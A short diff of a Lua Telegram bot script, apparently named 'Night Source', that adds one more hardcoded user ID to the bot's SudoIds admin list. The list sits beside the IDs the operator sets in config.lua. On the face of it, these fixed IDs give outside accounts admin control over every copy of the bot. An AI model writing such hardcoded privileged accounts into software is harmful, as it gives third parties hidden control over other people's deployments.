@@ -128,7 +128,7 @@ Night Source
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId or Config.SUDO
-SudoIds = {Config.SudoIds,782717203,1779659067} or {Config.sudo_users,782717203,1779659067}
+SudoIds = {Config.SudoIds,782717203,1809393499,1779659067} or {Config.sudo_users,782717203,1809393499,1779659067}
 Night = Config.Night or Config.bot_id
 TokenBot = Config.TokenBot or Config.token
 NameBot = (AliNight:get(Night..'Abs:NameBot') or 'نايت')
